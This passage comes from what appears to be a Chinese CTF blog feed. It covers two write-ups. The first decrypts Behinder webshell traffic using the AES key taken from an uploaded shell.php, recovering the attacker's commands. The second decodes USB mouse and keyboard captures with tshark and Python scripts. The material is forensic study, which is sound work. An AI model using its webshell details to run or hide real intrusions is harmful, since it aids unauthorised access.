&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90aGUteC5jbi9jcnlwdG9ncmFwaHkvQWVzLmFzcHg=&#34;&gt;https://the-x.cn/cryptography/Aes.aspx&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYubXp5MC5jb20vQ3liZXJDaGVmMy8=&#34;&gt;https://ctf.mzy0.com/CyberChef3/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aQgCMfOWwhWkM9j5.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里说明一下，在解密时需要将 aes 的加密模式调整为 CBC&lt;/p&gt;
&lt;p&gt;key 为上传的 shell.php 中的 16 位加密的密钥即 e45e329feb5d925b&lt;/p&gt;
&lt;p&gt;而偏移量默认为 0123456789abcdef&lt;/p&gt;
&lt;p&gt;可以看到的是有一个 decode 标识着括号里的 base64 码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pGTGwJsgs1qeMbL1.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 base64 复制下来放入网站中成功解密，而输出的这段代码便是冰蝎对我们命令执行时的加密代码，也同时可以在底部查看到我们输入的命令&lt;/p&gt;
&lt;p&gt;追踪流 23：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9ofiyS7wJA73jR6v.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;继续这样去找，能够找到我们之前输入的三个命令&lt;/p&gt;
&lt;p&gt;追踪流 29：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5PaASe86v1dEeqz4.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;追踪流 34：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xLBjKqlvupY4LhSu.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来切换一下左下角的选项，查看回应包&lt;/p&gt;
&lt;p&gt;追踪流 23：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4jmut6UKg3yewmBU.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;一样进行 AES 解密 -&amp;gt;base64 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZeLLHx28qrcMBUKr.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;将后面这段复制出来进行 base64 解密&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WT5iDXH8RF4wdb1r.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能发现成功和我们之前执行命令时的回显对上了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1jEMDZtPmWalFSVV.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来的两个也都是一样&lt;/p&gt;
&lt;p&gt;追踪流 29：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LPVSKZHY9omPgvQI.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于流 29 执行的命令是 ls&lt;br&gt;
/tmp，而 tmp 目录下没有东西，回显也能看到，因此解密出来为空&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bofnsQu1ctbjzk4z.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;追踪流 34：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EKk6b3I5Je4ZlU9Z.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;也是成功和回显对上了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fsjWNUUeyEMOWkg.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;回到开头所讲述的冰蝎 3.0 版本没有了动态密钥的获取，因此只有攻击者能够知道密钥是什么，而 2.0 的密钥是能够通过流量进行抓取的（抓取的是加密之后的密钥），相当于是密钥随身跟随，另外冰蝎还有许多的功能之后再慢慢研究&lt;/p&gt;
&lt;p&gt;本片文章是个人的一些看法，还望师傅们多多提建议&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS：最近开放了，还望师傅们多注意身体，别像我一样🐏了个🐏&lt;/p&gt;
&lt;/blockquote&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/USB/</guid>
            <title>USB</title>
            <link>https://nnnpc.github.io/2024/04/16/USB/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;最近做到之前经典的流量题有点多，usb 就是其中之一，这里记录一下&lt;/p&gt;
&lt;p&gt;首先 wireshark 打开附件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhLcuWbkya0tO5xt.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;滑动查看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vare5xin8L956m56.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能发现数据包的 HID&lt;br&gt;
Data 中带有四字节的数据，猜测为鼠标流量，用 tshark 提取 HID Data 数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tshark -r usb.pcapng -T fields -e usbhid.data &amp;gt; usbdata.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于是记录目前常用的两种 usb 协议流量，因此就直接进行说明&lt;br&gt;
在导出的 usbdata.txt 中可以看到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2FMn0yQhFoItARSW.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了 4 字节的鼠标流量之外，还有 16 字节的键盘流量，就借着这个附件说明两种流量解密方法&lt;/p&gt;
&lt;h2 id=&#34;鼠标流量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#鼠标流量&#34;&gt;#&lt;/a&gt; 鼠标流量&lt;/h2&gt;
&lt;p&gt;首先利用脚本进行删除空行，冒号分隔的操作&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;info = &amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali下运行：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tshark -r usb.pcap -T fields -e usb.capdata &amp;gt; usbdata.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;提取流量包信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(info)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f_data = input(&amp;quot;请输入带处理txt文件的路径：&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shujian = int(input(&amp;quot;鼠标流量信息请输入8，键盘流量请输入16：&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = open(f_data, &amp;#x27;r&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 整理到out.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;with open(&amp;#x27;out.txt&amp;#x27;, &amp;#x27;w&amp;#x27;) as f_out:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in f.readlines():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = i.strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # 鼠标流量长度为8 ，键盘流量长度为16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if len(s) == shujian:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # 鼠标流量长度为8 ，键盘流量长度为16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ns = &amp;quot;:&amp;quot;.join(nsl)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f_out.write(ns)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f_out.write(&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输入路径和 8&lt;br&gt;
 得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LJCTFRII7jB3Gjtb.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着提取坐标&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nums = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keys = open(&amp;#x27;out.txt&amp;#x27;,&amp;#x27;r&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = open(&amp;#x27;xy.txt&amp;#x27;,&amp;#x27;w&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;posx = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;posy = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for line in keys:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if len(line) != 12 :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        continue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = int(line[3:5],16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = int(line[6:8],16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if x &amp;gt; 127 :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x -= 256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if y &amp;gt; 127 :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        y -= 256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    posx += x&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    posy += y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if btn_flag == 1 : # 1 代表左键&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(str(posx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(&amp;#x27; &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(str(posy))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s7ruj39OHOpkHe8p.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 gnuplot 进行画图&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;plot &amp;quot;xy.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71m441A1k7qSjpYe.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9P5nlYJzTTNOtW3K.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然这题的 flag 并不是鼠标流量&lt;/p&gt;
&lt;h2 id=&#34;键盘流量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#键盘流量&#34;&gt;#&lt;/a&gt; 键盘流量&lt;/h2&gt;
&lt;p&gt;同样使用前面 tshark 提取出的 usbdata.txt&lt;/p&gt;
&lt;h3 id=&#34;一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一&#34;&gt;#&lt;/a&gt; 一&lt;/h3&gt;
&lt;p&gt;可以使用该脚本进行一把梭（该脚本会将不是 8 字节键盘流量的数据给剔除掉）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;normalKeys = &amp;#123;&amp;quot;04&amp;quot;:&amp;quot;a&amp;quot;, &amp;quot;05&amp;quot;:&amp;quot;b&amp;quot;, &amp;quot;06&amp;quot;:&amp;quot;c&amp;quot;, &amp;quot;07&amp;quot;:&amp;quot;d&amp;quot;, &amp;quot;08&amp;quot;:&amp;quot;e&amp;quot;, &amp;quot;09&amp;quot;:&amp;quot;f&amp;quot;, &amp;quot;0a&amp;quot;:&amp;quot;g&amp;quot;, &amp;quot;0b&amp;quot;:&amp;quot;h&amp;quot;, &amp;quot;0c&amp;quot;:&amp;quot;i&amp;quot;, &amp;quot;0d&amp;quot;:&amp;quot;j&amp;quot;, &amp;quot;0e&amp;quot;:&amp;quot;k&amp;quot;, &amp;quot;0f&amp;quot;:&amp;quot;l&amp;quot;, &amp;quot;10&amp;quot;:&amp;quot;m&amp;quot;, &amp;quot;11&amp;quot;:&amp;quot;n&amp;quot;, &amp;quot;12&amp;quot;:&amp;quot;o&amp;quot;, &amp;quot;13&amp;quot;:&amp;quot;p&amp;quot;, &amp;quot;14&amp;quot;:&amp;quot;q&amp;quot;, &amp;quot;15&amp;quot;:&amp;quot;r&amp;quot;, &amp;quot;16&amp;quot;:&amp;quot;s&amp;quot;, &amp;quot;17&amp;quot;:&amp;quot;t&amp;quot;, &amp;quot;18&amp;quot;:&amp;quot;u&amp;quot;, &amp;quot;19&amp;quot;:&amp;quot;v&amp;quot;, &amp;quot;1a&amp;quot;:&amp;quot;w&amp;quot;, &amp;quot;1b&amp;quot;:&amp;quot;x&amp;quot;, &amp;quot;1c&amp;quot;:&amp;quot;y&amp;quot;, &amp;quot;1d&amp;quot;:&amp;quot;z&amp;quot;,&amp;quot;1e&amp;quot;:&amp;quot;1&amp;quot;, &amp;quot;1f&amp;quot;:&amp;quot;2&amp;quot;, &amp;quot;20&amp;quot;:&amp;quot;3&amp;quot;, &amp;quot;21&amp;quot;:&amp;quot;4&amp;quot;, &amp;quot;22&amp;quot;:&amp;quot;5&amp;quot;, &amp;quot;23&amp;quot;:&amp;quot;6&amp;quot;,&amp;quot;24&amp;quot;:&amp;quot;7&amp;quot;,&amp;quot;25&amp;quot;:&amp;quot;8&amp;quot;,&amp;quot;26&amp;quot;:&amp;quot;9&amp;quot;,&amp;quot;27&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;28&amp;quot;:&amp;quot;&amp;lt;RET&amp;gt;&amp;quot;,&amp;quot;29&amp;quot;:&amp;quot;&amp;lt;ESC&amp;gt;&amp;quot;,&amp;quot;2a&amp;quot;:&amp;quot;&amp;lt;DEL&amp;gt;&amp;quot;, &amp;quot;2b&amp;quot;:&amp;quot;\t&amp;quot;,&amp;quot;2c&amp;quot;:&amp;quot;&amp;lt;SPACE&amp;gt;&amp;quot;,&amp;quot;2d&amp;quot;:&amp;quot;-&amp;quot;,&amp;quot;2e&amp;quot;:&amp;quot;=&amp;quot;,&amp;quot;2f&amp;quot;:&amp;quot;[&amp;quot;,&amp;quot;30&amp;quot;:&amp;quot;]&amp;quot;,&amp;quot;31&amp;quot;:&amp;quot;\\&amp;quot;,&amp;quot;32&amp;quot;:&amp;quot;&amp;lt;NON&amp;gt;&amp;quot;,&amp;quot;33&amp;quot;:&amp;quot;;&amp;quot;,&amp;quot;34&amp;quot;:&amp;quot;&amp;#x27;&amp;quot;,&amp;quot;35&amp;quot;:&amp;quot;&amp;lt;GA&amp;gt;&amp;quot;,&amp;quot;36&amp;quot;:&amp;quot;,&amp;quot;,&amp;quot;37&amp;quot;:&amp;quot;.&amp;quot;,&amp;quot;38&amp;quot;:&amp;quot;/&amp;quot;,&amp;quot;39&amp;quot;:&amp;quot;&amp;lt;CAP&amp;gt;&amp;quot;,&amp;quot;3a&amp;quot;:&amp;quot;&amp;lt;F1&amp;gt;&amp;quot;,&amp;quot;3b&amp;quot;:&amp;quot;&amp;lt;F2&amp;gt;&amp;quot;, &amp;quot;3c&amp;quot;:&amp;quot;&amp;lt;F3&amp;gt;&amp;quot;,&amp;quot;3d&amp;quot;:&amp;quot;&amp;lt;F4&amp;gt;&amp;quot;,&amp;quot;3e&amp;quot;:&amp;quot;&amp;lt;F5&amp;gt;&amp;quot;,&amp;quot;3f&amp;quot;:&amp;quot;&amp;lt;F6&amp;gt;&amp;quot;,&amp;quot;40&amp;quot;:&amp;quot;&amp;lt;F7&amp;gt;&amp;quot;,&amp;quot;41&amp;quot;:&amp;quot;&amp;lt;F8&amp;gt;&amp;quot;,&amp;quot;42&amp;quot;:&amp;quot;&amp;lt;F9&amp;gt;&amp;quot;,&amp;quot;43&amp;quot;:&amp;quot;&amp;lt;F10&amp;gt;&amp;quot;,&amp;quot;44&amp;quot;:&amp;quot;&amp;lt;F11&amp;gt;&amp;quot;,&amp;quot;45&amp;quot;:&amp;quot;&amp;lt;F12&amp;gt;&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shiftKeys = &amp;#123;&amp;quot;04&amp;quot;:&amp;quot;A&amp;quot;, &amp;quot;05&amp;quot;:&amp;quot;B&amp;quot;, &amp;quot;06&amp;quot;:&amp;quot;C&amp;quot;, &amp;quot;07&amp;quot;:&amp;quot;D&amp;quot;, &amp;quot;08&amp;quot;:&amp;quot;E&amp;quot;, &amp;quot;09&amp;quot;:&amp;quot;F&amp;quot;, &amp;quot;0a&amp;quot;:&amp;quot;G&amp;quot;, &amp;quot;0b&amp;quot;:&amp;quot;H&amp;quot;, &amp;quot;0c&amp;quot;:&amp;quot;I&amp;quot;, &amp;quot;0d&amp;quot;:&amp;quot;J&amp;quot;, &amp;quot;0e&amp;quot;:&amp;quot;K&amp;quot;, &amp;quot;0f&amp;quot;:&amp;quot;L&amp;quot;, &amp;quot;10&amp;quot;:&amp;quot;M&amp;quot;, &amp;quot;11&amp;quot;:&amp;quot;N&amp;quot;, &amp;quot;12&amp;quot;:&amp;quot;O&amp;quot;, &amp;quot;13&amp;quot;:&amp;quot;P&amp;quot;, &amp;quot;14&amp;quot;:&amp;quot;Q&amp;quot;, &amp;quot;15&amp;quot;:&amp;quot;R&amp;quot;, &amp;quot;16&amp;quot;:&amp;quot;S&amp;quot;, &amp;quot;17&amp;quot;:&amp;quot;T&amp;quot;, &amp;quot;18&amp;quot;:&amp;quot;U&amp;quot;, &amp;quot;19&amp;quot;:&amp;quot;V&amp;quot;, &amp;quot;1a&amp;quot;:&amp;quot;W&amp;quot;, &amp;quot;1b&amp;quot;:&amp;quot;X&amp;quot;, &amp;quot;1c&amp;quot;:&amp;quot;Y&amp;quot;, &amp;quot;1d&amp;quot;:&amp;quot;Z&amp;quot;,&amp;quot;1e&amp;quot;:&amp;quot;!&amp;quot;, 